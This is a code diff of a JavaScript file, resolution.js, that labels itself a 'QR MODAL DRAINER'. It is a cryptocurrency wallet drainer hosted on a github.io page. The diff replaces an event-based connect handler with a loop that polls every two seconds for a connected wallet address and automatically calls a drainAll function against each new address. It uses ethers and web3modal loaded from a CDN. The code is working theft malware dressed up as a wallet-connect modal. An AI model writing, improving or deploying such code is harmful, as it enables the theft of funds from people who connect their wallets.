@@ -1,4 +1,4 @@
-// resolution.js - OFFICIAL STANDALONE HTML MODAL
+// resolution.js - EMBEDDED QR MODAL DRAINER
 // Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=11
 
 const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
@@ -12,39 +12,31 @@ const TOKENS = {
   }
 };
 
-let modal;
+// Embed modal
+document.body.insertAdjacentHTML('beforeend', `
+  <w3m-modal projectId="${PROJECT_ID}" themeMode="dark"></w3m-modal>
+`);
 
-function loadScript(src, callback) {
-  const script = document.createElement('script');
-  script.src = src;
-  script.onload = callback;
-  script.onerror = () => console.error(`FAILED: ${src}`);
-  document.head.appendChild(script);
-}
+// Load ethers
+const ethersScript = document.createElement('script');
+ethersScript.src = 'https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js';
+ethersScript.onload = initDrainer;
+ethersScript.onerror = () => console.error('ETHERS LOAD FAILED');
+document.head.appendChild(ethersScript);
 
-function initDrainer() {
-  loadScript('https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js', () => {
-    loadScript('https://cdn.jsdelivr.net/npm/@web3modal/html@2.9.0/dist/index.umd.js', setupModal);
-  });
-}
-
-function setupModal() {
-  const { Web3Modal } = window['@web3modal/html'];
-
-  modal = new Web3Modal({
-    projectId: PROJECT_ID,
-    themeMode: 'dark'
-  });
-
-  modal.subscribeEvents(async (event) => {
-    if (event.name === 'CONNECT_SUCCESS') {
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      const user = await signer.getAddress();
-      console.log('Connected:', user);
-      await drainAll(provider, signer, user);
+async function initDrainer() {
+  setInterval(async () => {
+    if (window.ethereum?.isConnected?.() && window.ethereum.selectedAddress) {
+      const user = window.ethereum.selectedAddress;
+      if (window.lastDrained !== user) {
+        window.lastDrained = user;
+        console.log('Connected:', user);
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        await drainAll(provider, signer, user);
+      }
     }
-  });
+  }, 2000);
 }
 
 async function drainAll(provider, signer, user) {
@@ -84,7 +76,4 @@ async function drainAll(provider, signer, user) {
   }
 }
 
-window.connectWallet = () => modal.open();
-
-// Start
-initDrainer();
+window.connectWallet = () => document.querySelector('w3m-modal')?.open();
